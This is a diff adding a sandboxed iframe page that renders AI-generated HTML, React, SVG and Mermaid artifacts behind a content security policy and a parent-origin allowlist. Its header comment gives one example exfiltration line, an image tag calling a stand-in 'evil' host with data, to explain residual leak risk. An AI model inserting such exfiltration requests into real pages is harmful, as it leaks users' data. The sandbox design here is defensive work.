@@ -1,0 +1,298 @@
+<!doctype html>
+<!--
+  AGI Artifact Sandbox — apps/sandbox/index.html
+  --------------------------------------------------------------------------
+  Self-contained renderer for LLM-generated HTML / React / SVG / Mermaid /
+  Markdown / JSON / CSV / Code artifacts.
+
+  Deployed to a separate origin (e.g. https://sandbox.agiworkforce.com).
+  The parent app embeds this page in an iframe and ships the artifact via
+  postMessage. Because the iframe is cross-origin to the parent, scripts
+  inside the rendered artifact CANNOT:
+    - read the parent's cookies / localStorage / sessionStorage
+    - call parent fetch endpoints with the user's credentials
+    - read or write parent.document
+
+  The CSP meta tag below also blocks `connect-src` entirely, so scripts in
+  the artifact cannot exfiltrate to attacker domains via fetch / XHR /
+  WebSocket. Images, fonts, and inline styles are allowed because the
+  artifact may legitimately need them; an `<img src="https://evil/?data">`
+  only leaks what was already in the user's chat history (the data the
+  model put into the artifact was already on screen).
+
+  WEB-13 / WEB-20 / WEB-25 (audit 2026-05-19).
+-->
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title>AGI Artifact Sandbox</title>
+    <meta
+      http-equiv="Content-Security-Policy"
+      content="
+        default-src 'none';
+        script-src 'self' 'unsafe-inline' 'unsafe-eval'
+          https://unpkg.com
+          https://cdn.jsdelivr.net;
+        style-src 'self' 'unsafe-inline';
+        img-src 'self' data: blob: https:;
+        font-src 'self' data: https:;
+        connect-src 'none';
+        frame-src 'none';
+        base-uri 'none';
+        form-action 'none';
+        object-src 'none';
+      "
+    />
+    <style>
+      :root {
+        color-scheme: light dark;
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,
+          'Helvetica Neue', Arial, sans-serif;
+      }
+      html,
+      body {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        background: #fff;
+        color: #111;
+      }
+      #root {
+        height: 100%;
+        width: 100%;
+        overflow: auto;
+      }
+      #idle {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        height: 100%;
+        color: #999;
+        font-size: 13px;
+      }
+      #error {
+        color: #c00;
+        padding: 16px;
+        font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
+        font-size: 12px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="idle">Waiting for artifact…</div>
+    <div id="root" hidden></div>
+    <script>
+      'use strict';
+      (function () {
+        // --------------------------------------------------------------
+        // Parent-origin allowlist. Production parents are *.agiworkforce.com
+        // (apex + chat subdomain). Localhost is included for dev only.
+        // --------------------------------------------------------------
+        const ALLOWED_PARENT_ORIGINS = new Set([
+          'https://agiworkforce.com',
+          'https://chat.agiworkforce.com',
+          'https://www.agiworkforce.com',
+          'https://agiworkforce-chat.vercel.app',
+          'http://localhost:3000',
+          'http://127.0.0.1:3000',
+        ]);
+
+        function isAllowedParent(origin) {
+          if (ALLOWED_PARENT_ORIGINS.has(origin)) return true;
+          // Allow any *.vercel.app preview for the agiworkforce project.
+          // Format: agiworkforce-<hash>-<team>.vercel.app
+          try {
+            const u = new URL(origin);
+            if (
+              u.protocol === 'https:' &&
+              u.hostname.endsWith('.vercel.app') &&
+              u.hostname.startsWith('agiworkforce-')
+            ) {
+              return true;
+            }
+          } catch (e) {
+            // ignore
+          }
+          return false;
+        }
+
+        const idleEl = document.getElementById('idle');
+        const rootEl = document.getElementById('root');
+
+        function showError(msg) {
+          rootEl.hidden = false;
+          rootEl.innerHTML = '';
+          const pre = document.createElement('pre');
+          pre.id = 'error';
+          pre.textContent = msg;
+          rootEl.appendChild(pre);
+        }
+
+        function showRoot() {
+          idleEl.hidden = true;
+          rootEl.hidden = false;
+        }
+
+        // --------------------------------------------------------------
+        // Renderers — each takes the payload and writes into rootEl.
+        // --------------------------------------------------------------
+
+        function renderHtml(payload) {
+          rootEl.innerHTML = String(payload.html || '');
+          // Inline <script> tags in innerHTML do NOT execute. To run scripts
+          // the artifact must use the `script-tag` form (rare). Treat that
+          // as opt-in via a `runScripts: true` flag on the payload.
+          if (payload.runScripts === true) {
+            rootEl.querySelectorAll('script').forEach((oldScript) => {
+              const s = document.createElement('script');
+              for (const attr of oldScript.attributes) {
+                s.setAttribute(attr.name, attr.value);
+              }
+              s.text = oldScript.textContent || '';
+              oldScript.parentNode.replaceChild(s, oldScript);
+            });
+          }
+        }
+
+        function renderReact(payload) {
+          // React artifact: load React + ReactDOM + Babel-standalone from CDN
+          // and transpile the user code. CDN sources are pinned via the CSP
+          // allowlist (unpkg.com, cdn.jsdelivr.net).
+          const source = String(payload.code || payload.html || '');
+          rootEl.innerHTML =
+            '<div id="react-root"></div>' +
+            '<script src="https://unpkg.com/react@18/umd/react.production.min.js"' +
+            ' crossorigin></' + 'script>' +
+            '<script src="https://unpkg.com/react-dom@18/umd/react-dom.production.min.js"' +
+            ' crossorigin></' + 'script>' +
+            '<script src="https://unpkg.com/@babel/standalone/babel.min.js"' +
+            ' crossorigin></' + 'script>' +
+            '<script type="text/babel" data-presets="env,react">' +
+            source +
+            '\n; try { var App = (typeof App !== "undefined" && App) ||' +
+            ' (typeof Component !== "undefined" && Component);' +
+            ' if (App) { ReactDOM.createRoot(document.getElementById("react-root"))' +
+            '.render(React.createElement(App)); } } catch (e) {' +
+            ' document.getElementById("react-root").innerText = String(e); }' +
+            '</' + 'script>';
+          // The script tags above need re-injection to execute (see renderHtml).
+          rootEl.querySelectorAll('script').forEach((oldScript) => {
+            const s = document.createElement('script');
+            for (const attr of oldScript.attributes) {
+              s.setAttribute(attr.name, attr.value);
+            }
+            s.text = oldScript.textContent || '';
+            oldScript.parentNode.replaceChild(s, oldScript);
+          });
+        }
+
+        function renderSvg(payload) {
+          const svg = String(payload.svg || payload.html || '');
+          // Reject inline event handlers and javascript: URIs as a defensive
+          // measure on top of the cross-origin isolation. We leave the
+          // structure intact for legitimate SVG.
+          const cleaned = svg
+            .replace(/\son\w+\s*=\s*"[^"]*"/gi, '')
+            .replace(/\son\w+\s*=\s*'[^']*'/gi, '')
+            .replace(/href\s*=\s*(["'])\s*javascript:[^"']*\1/gi, 'href="#"');
+          rootEl.innerHTML = cleaned;
+        }
+
+        function renderMermaid(payload) {
+          rootEl.innerHTML = '<pre class="mermaid">' +
+            String(payload.code || '').replace(/[&<>]/g, function (c) {
+              return ({ '&': '&amp;', '<': '&lt;', '>': '&gt;' })[c];
+            }) +
+            '</pre>' +
+            '<script type="module">' +
+            'import mermaid from "https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.esm.min.mjs";' +
+            'mermaid.initialize({ startOnLoad: false, securityLevel: "strict" });' +
+            'mermaid.run({ querySelector: ".mermaid" });' +
+            '</' + 'script>';
+          rootEl.querySelectorAll('script').forEach((oldScript) => {
+            const s = document.createElement('script');
+            for (const attr of oldScript.attributes) {
+              s.setAttribute(attr.name, attr.value);
+            }
+            s.text = oldScript.textContent || '';
+            oldScript.parentNode.replaceChild(s, oldScript);
+          });
+        }
+
+        function renderText(payload) {
+          const pre = document.createElement('pre');
+          pre.style.padding = '16px';
+          pre.style.margin = '0';
+          pre.style.whiteSpace = 'pre-wrap';
+          pre.style.fontFamily =
+            'ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace';
+          pre.style.fontSize = '13px';
+          pre.textContent = String(payload.text || payload.code || '');
+          rootEl.innerHTML = '';
+          rootEl.appendChild(pre);
+        }
+
+        function dispatchRender(payload) {
+          const kind = String(payload.kind || '').toLowerCase();
+          showRoot();
+          try {
+            switch (kind) {
+              case 'html':
+                renderHtml(payload);
+                break;
+              case 'react':
+                renderReact(payload);
+                break;
+              case 'svg':
+                renderSvg(payload);
+                break;
+              case 'mermaid':
+                renderMermaid(payload);
+                break;
+              case 'markdown':
+              case 'text':
+              case 'code':
+                renderText(payload);
+                break;
+              default:
+                showError('Unsupported artifact kind: ' + kind);
+                return;
+            }
+            postToParent({ type: 'render-complete', kind: kind });
+          } catch (err) {
+            showError('Render error: ' + String(err && err.message ? err.message : err));
+            postToParent({ type: 'render-error', error: String(err) });
+          }
+        }
+
+        let parentOrigin = null;
+
+        function postToParent(msg) {
+          if (parentOrigin && window.parent && window.parent !== window) {
+            window.parent.postMessage(msg, parentOrigin);
+          }
+        }
+
+        window.addEventListener('message', function (event) {
+          if (!isAllowedParent(event.origin)) {
+            return; // silently drop — common during cross-origin probes
+          }
+          parentOrigin = event.origin;
+          const data = event.data;
+          if (!data || typeof data !== 'object') return;
+          if (data.type === 'render') {
+            dispatchRender(data);
+          }
+        });
+
+        // Announce readiness to whichever parent is hosting us. We don't know
+        // the parent's exact origin yet, so use '*' — the parent's own listener
+        // is responsible for verifying our origin against its allowlist.
+        if (window.parent && window.parent !== window) {
+          window.parent.postMessage({ type: 'sandbox-ready' }, '*');
+        }
+      })();
+    </script>
+  </body>
+</html>
